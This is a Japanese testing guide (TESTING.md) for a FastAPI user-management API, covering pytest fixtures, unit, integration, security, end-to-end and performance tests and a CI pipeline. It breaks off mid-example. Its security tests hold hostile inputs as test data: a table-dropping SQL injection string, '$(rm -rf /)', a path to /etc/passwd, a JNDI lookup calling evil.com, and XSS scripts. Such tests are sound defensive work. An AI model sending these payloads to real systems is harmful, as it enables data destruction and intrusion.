# TESTING.md

## 1. テスト戦略

### 1.1 テストピラミッド
```
    E2E Tests (少数)
        ↑
  Integration Tests (中程度)
        ↑
   Unit Tests (多数)
```

- **単体テスト (Unit Tests)**: 70% - 関数、メソッド単位のテスト
- **統合テスト (Integration Tests)**: 20% - コンポーネント間連携のテスト
- **E2Eテスト (End-to-End Tests)**: 10% - 全体フローのテスト

### 1.2 テスト方針
- **高速実行**: 開発サイクルを妨げない実行速度
- **独立性**: テスト間の依存関係を排除
- **再現可能性**: 環境に依存しない安定したテスト
- **保守性**: テストコード自体の品質も重視
- **網羅性**: 重要な機能とエッジケースを適切にカバー

## 2. テスト環境設定

### 2.1 pytest設定
```python
# conftest.py - pytest共通設定
import pytest
import asyncio
from httpx import AsyncClient
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from app.main import app
from app.database import get_db_session
from app.models.base import Base

# テスト用データベース設定
SQLALCHEMY_DATABASE_URL = "sqlite:///./test.db"
engine = create_engine(SQLALCHEMY_DATABASE_URL, connect_args={"check_same_thread": False})
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

def override_get_db():
    """テスト用データベースセッション"""
    try:
        db = TestingSessionLocal()
        yield db
    finally:
        db.close()

app.dependency_overrides[get_db_session] = override_get_db

@pytest.fixture(scope="session")
def event_loop():
    """非同期テスト用のイベントループ"""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

@pytest.fixture(scope="function")
def db_session():
    """テスト用データベースセッション"""
    # テーブル作成
    Base.metadata.create_all(bind=engine)
    
    db = TestingSessionLocal()
    try:
        yield db
    finally:
        db.close()
        # テーブル削除（各テスト後にクリーンアップ）
        Base.metadata.drop_all(bind=engine)

@pytest.fixture
def client():
    """FastAPI テストクライアント"""
    return TestClient(app)

@pytest.fixture
async def async_client():
    """非同期テストクライアント"""
    async with AsyncClient(app=app, base_url="http://test") as ac:
        yield ac

@pytest.fixture
def sample_user_data():
    """サンプルユーザーデータ"""
    return {
        "username": "testuser",
        "email": "test@example.com",
        "password": "TestPassword123!",
        "full_name": "Test User"
    }

@pytest.fixture
def admin_user(db_session):
    """テスト用管理者ユーザー"""
    from app.models.user import User
    from app.services.auth_service import AuthService
    
    auth_service = AuthService()
    admin_user = User(
        username="admin",
        email="admin@example.com",
        hashed_password=auth_service.get_password_hash("AdminPass123!"),
        role="admin",
        is_active=True
    )
    db_session.add(admin_user)
    db_session.commit()
    db_session.refresh(admin_user)
    return admin_user

@pytest.fixture
def auth_headers(admin_user):
    """認証ヘッダー"""
    from app.services.auth_service import AuthService
    
    auth_service = AuthService()
    token = auth_service.create_access_token(data={"sub": admin_user.username})
    return {"Authorization": f"Bearer {token}"}
```

### 2.2 pytest設定ファイル
```ini
# pytest.ini
[tool:pytest]
testpaths = tests
python_files = test_*.py *_test.py
python_classes = Test*
python_functions = test_*
addopts = 
    -v
    --tb=short
    --strict-markers
    --disable-warnings
    --cov=app
    --cov-report=html
    --cov-report=term-missing
    --cov-fail-under=80
markers =
    unit: Unit tests
    integration: Integration tests
    e2e: End-to-end tests
    slow: Slow running tests
    security: Security tests
    skip_ci: Skip in CI environment
```

## 3. 単体テスト (Unit Tests)

### 3.1 サービス層のテスト
```python
# tests/test_services/test_user_service.py
import pytest
from unittest.mock import Mock, patch
from app.services.user_service import UserService
from app.models.user import User
from app.schemas.user import UserCreate
from app.exceptions.custom_exceptions import BusinessLogicError

class TestUserService:
    """UserServiceの単体テスト"""
    
    @pytest.fixture
    def user_service(self, db_session):
        """UserServiceインスタンス"""
        return UserService(db_session)
    
    @pytest.fixture
    def sample_user(self, db_session):
        """サンプルユーザー"""
        user = User(
            username="testuser",
            email="test@example.com",
            hashed_password="hashed_password",
            full_name="Test User"
        )
        db_session.add(user)
        db_session.commit()
        db_session.refresh(user)
        return user
    
    @pytest.mark.unit
    def test_get_user_by_id_success(self, user_service, sample_user):
        """ユーザーIDでの取得成功テスト"""
        # Act
        result = user_service.get_user_by_id(sample_user.id)
        
        # Assert
        assert result is not None
        assert result.id == sample_user.id
        assert result.username == sample_user.username
    
    @pytest.mark.unit
    def test_get_user_by_id_not_found(self, user_service):
        """存在しないユーザーIDでの取得テスト"""
        # Act
        result = user_service.get_user_by_id(999)
        
        # Assert
        assert result is None
    
    @pytest.mark.unit
    async def test_create_user_success(self, user_service, sample_user_data):
        """ユーザー作成成功テスト"""
        # Arrange
        user_create = UserCreate(**sample_user_data)
        
        # Act
        with patch.object(user_service, '_send_welcome_email') as mock_email:
            result = await user_service.create_user(user_create)
        
        # Assert
        assert result.username == user_create.username
        assert result.email == user_create.email
        assert result.is_active is True
        mock_email.assert_called_once_with(result)
    
    @pytest.mark.unit
    async def test_create_user_duplicate_email(self, user_service, sample_user, sample_user_data):
        """重複メールアドレスでのユーザー作成テスト"""
        # Arrange
        sample_user_data["email"] = sample_user.email
        user_create = UserCreate(**sample_user_data)
        
        # Act & Assert
        with pytest.raises(BusinessLogicError) as exc_info:
            await user_service.create_user(user_create)
        
        assert "already exists" in str(exc_info.value)
    
    @pytest.mark.unit
    def test_update_user_success(self, user_service, sample_user):
        """ユーザー更新成功テスト"""
        # Arrange
        update_data = {"full_name": "Updated Name"}
        
        # Act
        result = user_service.update_user(sample_user.id, update_data)
        
        # Assert
        assert result.full_name == "Updated Name"
        assert result.updated_at is not None
    
    @pytest.mark.unit
    def test_delete_user_success(self, user_service, sample_user):
        """ユーザー削除成功テスト"""
        # Act
        result = user_service.delete_user(sample_user.id)
        
        # Assert
        assert result is True
        deleted_user = user_service.get_user_by_id(sample_user.id)
        assert deleted_user is None
    
    @pytest.mark.unit
    @patch('app.services.user_service.logger')
    def test_delete_user_not_found_logs_warning(self, mock_logger, user_service):
        """存在しないユーザー削除時のログテスト"""
        # Act
        result = user_service.delete_user(999)
        
        # Assert
        assert result is False
        mock_logger.warning.assert_called_once()
```

### 3.2 バリデーション処理のテスト
```python
# tests/test_schemas/test_user_schemas.py
import pytest
from pydantic import ValidationError
from app.schemas.user import UserCreate, UserUpdate

class TestUserSchemas:
    """ユーザースキーマのバリデーションテスト"""
    
    @pytest.mark.unit
    def test_user_create_valid_data(self, sample_user_data):
        """有効なデータでのユーザー作成スキーマテスト"""
        # Act
        user_create = UserCreate(**sample_user_data)
        
        # Assert
        assert user_create.username == sample_user_data["username"]
        assert user_create.email == sample_user_data["email"]
    
    @pytest.mark.unit
    def test_user_create_invalid_email(self, sample_user_data):
        """無効なメールアドレスでのバリデーションテスト"""
        # Arrange
        sample_user_data["email"] = "invalid-email"
        
        # Act & Assert
        with pytest.raises(ValidationError) as exc_info:
            UserCreate(**sample_user_data)
        
        assert "email" in str(exc_info.value)
    
    @pytest.mark.unit
    @pytest.mark.parametrize("invalid_password", [
        "short",          # 短すぎる
        "nouppercase1!",  # 大文字なし
        "NOLOWERCASE1!",  # 小文字なし
        "NoNumbers!",     # 数字なし
        "NoSymbols123"    # 記号なし
    ])
    def test_user_create_invalid_password(self, sample_user_data, invalid_password):
        """無効なパスワードでのバリデーションテスト"""
        # Arrange
        sample_user_data["password"] = invalid_password
        
        # Act & Assert
        with pytest.raises(ValidationError) as exc_info:
            UserCreate(**sample_user_data)
        
        assert "password" in str(exc_info.value)
    
    @pytest.mark.unit
    @pytest.mark.parametrize("invalid_username", [
        "ab",              # 短すぎる
        "a" * 51,         # 長すぎる
        "user@name",      # 無効な文字
        "user name"       # スペース
    ])
    def test_user_create_invalid_username(self, sample_user_data, invalid_username):
        """無効なユーザー名でのバリデーションテスト"""
        # Arrange
        sample_user_data["username"] = invalid_username
        
        # Act & Assert
        with pytest.raises(ValidationError):
            UserCreate(**sample_user_data)
```

### 3.3 ユーティリティ関数のテスト
```python
# tests/test_utils/test_validators.py
import pytest
from app.utils.validators import validate_email, validate_password_strength, sanitize_input

class TestValidators:
    """バリデーター関数のテスト"""
    
    @pytest.mark.unit
    @pytest.mark.parametrize("valid_email", [
        "test@example.com",
        "user.name@domain.co.jp",
        "user+tag@example.org"
    ])
    def test_validate_email_valid(self, valid_email):
        """有効なメールアドレスのテスト"""
        assert validate_email(valid_email) is True
    
    @pytest.mark.unit
    @pytest.mark.parametrize("invalid_email", [
        "invalid-email",
        "@example.com",
        "user@",
        "user name@example.com"
    ])
    def test_validate_email_invalid(self, invalid_email):
        """無効なメールアドレスのテスト"""
        assert validate_email(invalid_email) is False
    
    @pytest.mark.unit
    def test_sanitize_input_xss_prevention(self):
        """XSS防止のサニタイズテスト"""
        # Arrange
        malicious_input = "<script>alert('XSS')</script>"
        
        # Act
        sanitized = sanitize_input(malicious_input)
        
        # Assert
        assert "<script>" not in sanitized
        assert "&lt;script&gt;" in sanitized
```

## 4. 統合テスト (Integration Tests)

### 4.1 API エンドポイントテスト
```python
# tests/test_api/test_user_api.py
import pytest
from fastapi import status
from app.models.user import User

class TestUserAPI:
    """ユーザーAPI統合テスト"""
    
    @pytest.mark.integration
    async def test_create_user_success(self, async_client, sample_user_data, auth_headers):
        """ユーザー作成API成功テスト"""
        # Act
        response = await async_client.post(
            "/api/v1/users/",
            json=sample_user_data,
            headers=auth_headers
        )
        
        # Assert
        assert response.status_code == status.HTTP_201_CREATED
        data = response.json()
        assert data["success"] is True
        assert data["data"]["username"] == sample_user_data["username"]
        assert data["data"]["email"] == sample_user_data["email"]
        assert "password" not in data["data"]  # パスワードが含まれていないことを確認
    
    @pytest.mark.integration
    async def test_create_user_validation_error(self, async_client, auth_headers):
        """ユーザー作成APIバリデーションエラーテスト"""
        # Arrange
        invalid_data = {
            "username": "ab",  # 短すぎる
            "email": "invalid-email",
            "password": "weak"
        }
        
        # Act
        response = await async_client.post(
            "/api/v1/users/",
            json=invalid_data,
            headers=auth_headers
        )
        
        # Assert
        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
        data = response.json()
        assert data["success"] is False
        assert "errors" in data
    
    @pytest.mark.integration
    async def test_get_users_pagination(self, async_client, auth_headers, db_session):
        """ユーザー一覧取得ページネーションテスト"""
        # Arrange - 複数ユーザー作成
        users = []
        for i in range(25):
            user = User(
                username=f"user{i}",
                email=f"user{i}@example.com",
                hashed_password="hashed_password"
            )
            users.append(user)
            db_session.add(user)
        db_session.commit()
        
        # Act
        response = await async_client.get(
            "/api/v1/users/?page=1&per_page=10",
            headers=auth_headers
        )
        
        # Assert
        assert response.status_code == status.HTTP_200_OK
        data = response.json()
        assert data["success"] is True
        assert len(data["data"]) == 10
        assert data["meta"]["pagination"]["total"] == 25
        assert data["meta"]["pagination"]["has_next"] is True
    
    @pytest.mark.integration
    async def test_get_user_by_id(self, async_client, sample_user, auth_headers):
        """ユーザー個別取得テスト"""
        # Act
        response = await async_client.get(
            f"/api/v1/users/{sample_user.id}",
            headers=auth_headers
        )
        
        # Assert
        assert response.status_code == status.HTTP_200_OK
        data = response.json()
        assert data["data"]["id"] == sample_user.id
        assert data["data"]["username"] == sample_user.username
    
    @pytest.mark.integration
    async def test_update_user_success(self, async_client, sample_user, auth_headers):
        """ユーザー更新成功テスト"""
        # Arrange
        update_data = {
            "username": sample_user.username,
            "email": sample_user.email,
            "full_name": "Updated Name",
            "is_active": True,
            "role": "user"
        }
        
        # Act
        response = await async_client.put(
            f"/api/v1/users/{sample_user.id}",
            json=update_data,
            headers=auth_headers
        )
        
        # Assert
        assert response.status_code == status.HTTP_200_OK
        data = response.json()
        assert data["data"]["full_name"] == "Updated Name"
    
    @pytest.mark.integration
    async def test_delete_user_success(self, async_client, sample_user, auth_headers):
        """ユーザー削除成功テスト"""
        # Act
        response = await async_client.delete(
            f"/api/v1/users/{sample_user.id}",
            headers=auth_headers
        )
        
        # Assert
        assert response.status_code == status.HTTP_204_NO_CONTENT
        
        # 削除確認
        get_response = await async_client.get(
            f"/api/v1/users/{sample_user.id}",
            headers=auth_headers
        )
        assert get_response.status_code == status.HTTP_404_NOT_FOUND
```

### 4.2 データベース統合テスト
```python
# tests/test_database/test_user_repository.py
import pytest
from app.repositories.user_repository import UserRepository
from app.models.user import User

class TestUserRepository:
    """ユーザーリポジトリ統合テスト"""
    
    @pytest.fixture
    def user_repo(self, db_session):
        return UserRepository(db_session)
    
    @pytest.mark.integration
    def test_create_and_retrieve_user(self, user_repo, sample_user_data):
        """ユーザー作成と取得の統合テスト"""
        # Arrange
        user_data = User(**sample_user_data, hashed_password="hashed_password")
        
        # Act - 作成
        created_user = user_repo.create(user_data)
        
        # Assert - 作成確認
        assert created_user.id is not None
        assert created_user.username == sample_user_data["username"]
        
        # Act - 取得
        retrieved_user = user_repo.get_by_id(created_user.id)
        
        # Assert - 取得確認
        assert retrieved_user.id == created_user.id
        assert retrieved_user.username == created_user.username
    
    @pytest.mark.integration
    def test_filter_users_by_criteria(self, user_repo, db_session):
        """フィルタ条件でのユーザー取得テスト"""
        # Arrange
        users = [
            User(username="active_user", email="active@example.com", 
                 hashed_password="hash", is_active=True),
            User(username="inactive_user", email="inactive@example.com", 
                 hashed_password="hash", is_active=False),
        ]
        for user in users:
            db_session.add(user)
        db_session.commit()
        
        # Act
        active_users = user_repo.filter_by_active(is_active=True)
        
        # Assert
        assert len(active_users) == 1
        assert active_users[0].username == "active_user"
    
    @pytest.mark.integration
    def test_complex_query_with_joins(self, user_repo, db_session):
        """複雑なクエリ（JOIN含む）のテスト"""
        # Arrange - ユーザーと関連データ作成
        user = User(username="testuser", email="test@example.com", 
                   hashed_password="hash")
        db_session.add(user)
        db_session.commit()
        
        # 関連テーブルのデータ作成（例：プロファイル）
        from app.models.user_profile import UserProfile
        profile = UserProfile(user_id=user.id, bio="Test bio")
        db_session.add(profile)
        db_session.commit()
        
        # Act
        result = user_repo.get_user_with_profile(user.id)
        
        # Assert
        assert result.username == "testuser"
        assert result.profile.bio == "Test bio"
```

## 5. セキュリティテスト

### 5.1 認証・認可テスト
```python
# tests/test_security/test_authentication.py
import pytest
from fastapi import status
from app.services.auth_service import AuthService

class TestAuthentication:
    """認証機能のセキュリティテスト"""
    
    @pytest.mark.security
    async def test_protected_endpoint_without_token(self, async_client):
        """認証なしでの保護されたエンドポイントアクセステスト"""
        # Act
        response = await async_client.get("/api/v1/users/")
        
        # Assert
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    @pytest.mark.security
    async def test_protected_endpoint_with_invalid_token(self, async_client):
        """無効なトークンでのアクセステスト"""
        # Arrange
        invalid_headers = {"Authorization": "Bearer invalid-token"}
        
        # Act
        response = await async_client.get("/api/v1/users/", headers=invalid_headers)
        
        # Assert
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    @pytest.mark.security
    async def test_expired_token_rejection(self, async_client):
        """期限切れトークンの拒否テスト"""
        # Arrange
        auth_service = AuthService()
        # 期限切れトークン作成（過去の時刻）
        expired_token = auth_service.create_access_token(
            data={"sub": "testuser"}, 
            expires_delta=-3600  # 1時間前に期限切れ
        )
        expired_headers = {"Authorization": f"Bearer {expired_token}"}
        
        # Act
        response = await async_client.get("/api/v1/users/", headers=expired_headers)
        
        # Assert
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    @pytest.mark.security
    async def test_role_based_access_control(self, async_client, db_session):
        """ロールベースアクセス制御テスト"""
        # Arrange - 一般ユーザー作成
        regular_user = User(
            username="regular_user",
            email="regular@example.com",
            hashed_password="hash",
            role="user"
        )
        db_session.add(regular_user)
        db_session.commit()
        
        auth_service = AuthService()
        user_token = auth_service.create_access_token(data={"sub": regular_user.username})
        user_headers = {"Authorization": f"Bearer {user_token}"}
        
        # Act - 管理者権限が必要なエンドポイントへのアクセス試行
        response = await async_client.post(
            "/api/v1/users/",
            json={"username": "newuser", "email": "new@example.com", "password": "Password123!"},
            headers=user_headers
        )
        
        # Assert
        assert response.status_code == status.HTTP_403_FORBIDDEN
```

### 5.2 入力検証セキュリティテスト
```python
# tests/test_security/test_input_validation.py
import pytest
from fastapi import status

class TestInputValidationSecurity:
    """入力検証セキュリティテスト"""
    
    @pytest.mark.security
    async def test_sql_injection_prevention(self, async_client, auth_headers):
        """SQLインジェクション対策テスト"""
        # Arrange
        malicious_input = "'; DROP TABLE users; --"
        
        # Act
        response = await async_client.get(
            f"/api/v1/users/?search={malicious_input}",
            headers=auth_headers
        )
        
        # Assert - 正常に処理され、エラーが発生しないことを確認
        assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR
        # データベースが正常であることを確認
        users_response = await async_client.get("/api/v1/users/", headers=auth_headers)
        assert users_response.status_code == status.HTTP_200_OK
    
    @pytest.mark.security
    async def test_xss_prevention_in_user_creation(self, async_client, auth_headers):
        """ユーザー作成時のXSS対策テスト"""
        # Arrange
        xss_payload = "<script>alert('XSS')</script>"
        user_data = {
            "username": "testuser",
            "email": "test@example.com",
            "password": "Password123!",
            "full_name": xss_payload
        }
        
        # Act
        response = await async_client.post(
            "/api/v1/users/",
            json=user_data,
            headers=auth_headers
        )
        
        # Assert
        if response.status_code == status.HTTP_201_CREATED:
            data = response.json()
            # スクリプトタグがエスケープされていることを確認
            assert "<script>" not in data["data"]["full_name"]
            assert "&lt;script&gt;" in data["data"]["full_name"]
    
    @pytest.mark.security
    @pytest.mark.parametrize("malicious_payload", [
        "../../../etc/passwd",          # パストラバーサル
        "$(rm -rf /)",                  # コマンドインジェクション
        "${jndi:ldap://evil.com/}",    # LDAP インジェクション
        "javascript:alert('XSS')",      # JavaScript URI
    ])
    async def test_malicious_input_sanitization(self, async_client, auth_headers, malicious_payload):
        """悪意ある入力のサニタイゼーションテスト"""
        # Arrange
        user_data = {
            "username": "testuser",
            "email": "test@example.com", 
            "password": "Password123!",
            "full_name": malicious_payload
        }
        
        # Act
        response = await async_client.post(
            "/api/v1/users/",
            json=user_data,
            headers=auth_headers
        )
        
        # Assert - サーバーエラーが発生しないことを確認
        assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR
```

### 5.3 レート制限テスト
```python
# tests/test_security/test_rate_limiting.py
import pytest
import asyncio
from fastapi import status

class TestRateLimiting:
    """レート制限テスト"""
    
    @pytest.mark.security
    @pytest.mark.slow
    async def test_login_rate_limiting(self, async_client):
        """ログインエンドポイントのレート制限テスト"""
        # Arrange
        login_data = {
            "username": "nonexistent",
            "password": "wrongpassword"
        }
        
        # Act - 大量のログイン試行
        responses = []
        for i in range(10):  # レート制限の閾値を超える回数
            response = await async_client.post("/api/v1/auth/login", json=login_data)
            responses.append(response)
            
            # レート制限に達したかチェック
            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                break
        
        # Assert
        rate_limited_responses = [r for r in responses if r.status_code == status.HTTP_429_TOO_MANY_REQUESTS]
        assert len(rate_limited_responses) > 0, "Rate limiting should be triggered"
    
    @pytest.mark.security
    async def test_api_rate_limiting(self, async_client, auth_headers):
        """API エンドポイントのレート制限テスト"""
        # Act - 短時間で大量のリクエスト送信
        responses = []
        for i in range(150):  # レート制限を超える回数
            response = await async_client.get("/api/v1/users/", headers=auth_headers)
            responses.append(response)
            
            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                break
        
        # Assert
        assert any(r.status_code == status.HTTP_429_TOO_MANY_REQUESTS for r in responses)
```

## 6. E2E テスト (End-to-End Tests)

### 6.1 ユーザー管理フローテスト
```python
# tests/test_e2e/test_user_management_flow.py
import pytest
from fastapi import status

class TestUserManagementFlow:
    """ユーザー管理の E2E テスト"""
    
    @pytest.mark.e2e
    async def test_complete_user_lifecycle(self, async_client, auth_headers):
        """ユーザーライフサイクル全体のテスト"""
        
        # Step 1: ユーザー作成
        user_data = {
            "username": "e2e_testuser",
            "email": "e2e@example.com",
            "password": "Password123!",
            "full_name": "E2E Test User"
        }
        
        create_response = await async_client.post(
            "/api/v1/users/",
            json=user_data,
            headers=auth_headers
        )
        assert create_response.status_code == status.HTTP_201_CREATED
        created_user = create_response.json()["data"]
        user_id = created_user["id"]
        
        # Step 2: 作成したユーザーを取得
        get_response = await async_client.get(
            f"/api/v1/users/{user_id}",
            headers=auth_headers
        )
        assert get_response.status_code == status.HTTP_200_OK
        retrieved_user = get_response.json()["data"]
        assert retrieved_user["username"] == user_data["username"]
        
        # Step 3: ユーザー情報を更新
        update_data = {
            "username": retrieved_user["username"],
            "email": retrieved_user["email"], 
            "full_name": "Updated E2E Test User",
            "is_active": True,
            "role": "user"
        }
        
        update_response = await async_client.put(
            f"/api/v1/users/{user_id}",
            json=update_data,
            headers=auth_headers
        )
        assert update_response.status_code == status.HTTP_200_OK
        updated_user = update_response.json()["data"]
        assert updated_user["full_name"] == "Updated E2E Test User"
        
        # Step 4: ユーザー一覧で確認
        list_response = await async_client.get(
            f"/api/v1/users/?search={user_data['username']}",
            headers=auth_headers
        )
        assert list_response.status_code == status.HTTP_200_OK
        users_list = list_response.json()["data"]
        assert len(users_list) >= 1
        assert any(u["id"] == user_id for u in users_list)
        
        # Step 5: ユーザーを削除
        delete_response = await async_client.delete(
            f"/api/v1/users/{user_id}",
            headers=auth_headers
        )
        assert delete_response.status_code == status.HTTP_204_NO_CONTENT
        
        # Step 6: 削除確認
        final_get_response = await async_client.get(
            f"/api/v1/users/{user_id}",
            headers=auth_headers
        )
        assert final_get_response.status_code == status.HTTP_404_NOT_FOUND
    
    @pytest.mark.e2e
    async def test_user_authentication_flow(self, async_client, db_session):
        """ユーザー認証フローのE2Eテスト"""
        
        # Step 1: 新規ユーザー作成（管理者として）
        admin_user = User(
            username="admin",
            email="admin@example.com",
            hashed_password=auth_service.get_password_hash("AdminPass123!"),
            role="admin",
            is_active=True
        )
        db_session.add(admin_user)
        db_session.commit()
        
        # 管理者としてログイン
        admin_login_response = await async_client.post(
            "/api/v1/auth/login",
            json={"username": "admin", "password": "AdminPass123!"}
        )
        assert admin_login_response.status_code == status.HTTP_200_OK
        admin_token = admin_login_response.json()["access_token"]
        admin_headers = {"Authorization": f"Bearer {admin_token}"}
        
        # 新規ユーザー作成
        new_user_data = {
            "username": "newuser",
            "email": "newuser@example.com",
            "password": "UserPass123!",
            "role": "user"
        }
        
        create_response = await async_client.post(
            "/api/v1/users/",
            json=new_user_data,
            headers=admin_headers
        )
        assert create_response.status_code == status.HTTP_201_CREATED
        
        # Step 2: 新規ユーザーでログイン
        user_login_response = await async_client.post(
            "/api/v1/auth/login",
            json={"username": "newuser", "password": "UserPass123!"}
        )
        assert user_login_response.status_code == status.HTTP_200_OK
        user_token = user_login_response.json()["access_token"]
        user_headers = {"Authorization": f"Bearer {user_token}"}
        
        # Step 3: 一般ユーザーで自分の情報取得
        profile_response = await async_client.get(
            "/api/v1/auth/profile",
            headers=user_headers
        )
        assert profile_response.status_code == status.HTTP_200_OK
        profile = profile_response.json()["data"]
        assert profile["username"] == "newuser"
        
        # Step 4: 一般ユーザーで管理者権限が必要な操作を試行（失敗するはず）
        forbidden_response = await async_client.post(
            "/api/v1/users/",
            json=new_user_data,
            headers=user_headers
        )
        assert forbidden_response.status_code == status.HTTP_403_FORBIDDEN
```

## 7. パフォーマンステスト

### 7.1 負荷テスト
```python
# tests/test_performance/test_load_testing.py
import pytest
import asyncio
import time
from concurrent.futures import ThreadPoolExecutor

class TestPerformance:
    """パフォーマンステスト"""
    
    @pytest.mark.slow
    async def test_concurrent_user_creation(self, async_client, auth_headers):
        """同時ユーザー作成のパフォーマンステスト"""
        
        async def create_user(index):
            user_data = {
                "username": f"perfuser{index}",
                "email": f"perfuser{index}@example.com",
                "password": "Password123!",
                "full_name": f"Performance User {index}"
            }
            
            start_time = time.time()
            response = await async_client.post(
                "/api/v1/users/",
                json=user_data,
                headers=auth_headers
            )
            end_time = time.time()
            
            return {
                "status_code": response.status_code,
                "response_time": end_time - start_time,
                "index": index
            }
        
        # 同時に50ユーザーを作成
        tasks = [create_user(i) for i in range(50)]
        results = await asyncio.gather(*tasks)
        
        # パフォーマンス評価
        successful_requests = [r for r in results if r["status_code"] == 201]
        avg_response_time = sum(r["response_time"] for r in successful_requests) / len(successful_requests)
        
        # アサーション
        assert len(successful_requests) >= 45  # 90%以上成功
        assert avg_response_time < 2.0  # 平均レスポンス時間2秒未満
        assert all(r["response_time"] < 5.0 for r in successful_requests)  # 全て5秒未満
    
    @pytest.mark.slow
    async def test_large_data_retrieval_performance(self, async_client, auth_headers, db_session):
        """大量データ取得のパフォーマンステスト"""
        
        # 大量ユーザーデータ作成
        users = []
        for i in range(1000):
            user = User(
                username=f"bulkuser{i}",
                email=f"bulkuser{i}@example.com",
                hashed_password="hashed_password"
            )
            users.append(user)
        
        db_session.add_all(users)
        db_session.commit()
        
        # 大量データ取得テスト
        start_time = time.time()
        response = await async_client.get(
            "/api/v1/users/?per_page=100",
            headers=auth_headers
        )
        end_time = time.time()
        
        response_time = end_time - start_time
        
        # アサーション
        assert response.status_code == 200
        assert response_time < 3.0  # 3秒未満でレスポンス
        
        data = response.json()
        assert len(data["data"]) == 100  # 期待される件数
```

## 8. テスト自動化

### 8.1 CI/CD パイプライン設定
```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    
    services:
      postgres:
        image: postgres:13
        env:
          POSTGRES_PASSWORD: testpass
          POSTGRES_DB: testdb
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.9'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements/test.txt
    
    - name: Run linting
      run: |
        flake8 app tests
        black --check app tests
        mypy app
    
    - name: Run unit tests
      run: |
        pytest tests/ -m "unit" --cov=app --cov-report=xml
    
    - name: Run integration tests
      run: |
        pytest tests/ -m "integration" --cov=app --cov-append --cov-report=xml
      env:
        DATABASE_URL: postgresql://postgres:testpass@localhost/testdb
    
    - name: Run security tests
      run: |
        pytest tests/ -m "security" --cov=app --cov-append --cov-report=xml
    
    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml
    
    - name: Run E2E tests (on main branch only)
      if: github.ref == 'refs/heads/main'
      run: |
        pytest tests/ -m "e2e"
      env:
        DATABASE_URL: postgresql://postgres:testpass@localhost/testdb
```

### 8.2 テストレポート生成
```python
# scripts/generate_test_report.py
import subprocess
import json
from datetime import datetime

def generate_test_report():
    """テストレポート生成スクリプト"""
    
    # テスト実行とレポート生成
    result = subprocess.run([
        "pytest", 
        "tests/",
        "--json-report",
        "--json-report-file=test_report.json",
        "--cov=app",
        "--cov-report=html",
        "--cov-report=json"
    ], capture_output=True, text=True)
    
    # レポート読み込み
    with open("test_report.json", "r") as f:
        test_data = json.load(f)
    
    with open("coverage.json", "r") as f:
        coverage_data = json.load(f)
    
    # サマリー作成
    summary = {
        "timestamp": datetime.now().isoformat(),
        "tests": {
            "total": test_data["summary"]["total"],
            "passed": test_data["summary"]["passed"],
            "failed": test_data["summary"]["failed"],
            "skipped": test_data["summary"]["skipped"]
        },
        "coverage": {
            "total": coverage_data["totals"]["percent_covered"],
            "missing_lines": coverage_data["totals"]["missing_lines"]
        },
        "duration": test_data["duration"]
    }
    
    # HTML レポート生成
    html_report = f"""
    <html>
    <head><title>Test Report</title></head>
    <body>
        <h1>Test Report - {summary['timestamp']}</h1>
        <h2>Test Results</h2>
        <p>Total: {summary['tests']['total']}</p>
        <p>Passed: {summary['tests']['passed']}</p>
        <p>Failed: {summary['tests']['failed']}</p>
        <p>Coverage: {summary['coverage']['total']:.2f}%</p>
        <p>Duration: {summary['duration']:.2f}s</p>
    </body>
    </html>
    """
    
    with open("test_report.html", "w") as f:
        f.write(html_report)
    
    print(f"Test report generated: {summary}")

if __name__ == "__main__":
    generate_test_report()
```

## 9. テストベストプラクティス

### 9.1 テストデータ管理
```python
# tests/fixtures/test_data.py
from typing import Dict, Any, List
import json
from pathlib import Path

class TestDataManager:
    """テストデータ管理クラス"""
    
    def __init__(self, data_dir: str = "tests/data"):
        self.data_dir = Path(data_dir)
        self.data_dir.mkdir(exist_ok=True)
    
    def load_test_data(self, filename: str) -> Dict[str, Any]:
        """テストデータ読み込み"""
        file_path = self.data_dir / f"{filename}.json"
        with open(file_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    
    def create_user_scenarios(self) -> List[Dict[str, Any]]:
        """ユーザーテストシナリオ作成"""
        return [
            {
                "name": "valid_user",
                "data": {
                    "username": "validuser",
                    "email": "valid@example.com", 
                    "password": "ValidPass123!",
                    "full_name": "Valid User"
                },
                "expected_status": 201
            },
            {
                "name": "invalid_email",
                "data": {
                    "username": "invaliduser",
                    "email": "invalid-email",
                    "password": "ValidPass123!",
                    "full_name": "Invalid User"
                },
                "expected_status": 422
            },
            {
                "name": "weak_password",
                "data": {
                    "username": "weakuser",
                    "email": "weak@example.com",
                    "password": "weak",
                    "full_name": "Weak Password User"
                },
                "expected_status": 422
            }
        ]

# 使用例
@pytest.fixture
def test_data_manager():
    return TestDataManager()

@pytest.mark.parametrize("scenario", TestDataManager().create_user_scenarios())
async def test_user_creation_scenarios(async_client, auth_headers, scenario):
    """ユーザー作成シナリオテスト"""
    response = await async_client.post(
        "/api/v1/users/",
        json=scenario["data"],
        headers=auth_headers
    )
    assert response.status_code == scenario["expected_status"]
```

### 9.2 モックとスタブ
```python
# tests/test_mocks/test_external_services.py
import pytest
from unittest.mock import Mock, patch, AsyncMock
from app.services.email_service import EmailService

class TestExternalServiceMocks:
    """外部サービスのモックテスト"""
    
    @pytest.mark.unit
    @patch('app.services.email_service.smtplib.SMTP')
    async def test_email_service_with_mock(self, mock_smtp):
        """メールサービスのモックテスト"""
        # Arrange
        mock_smtp_instance = Mock()
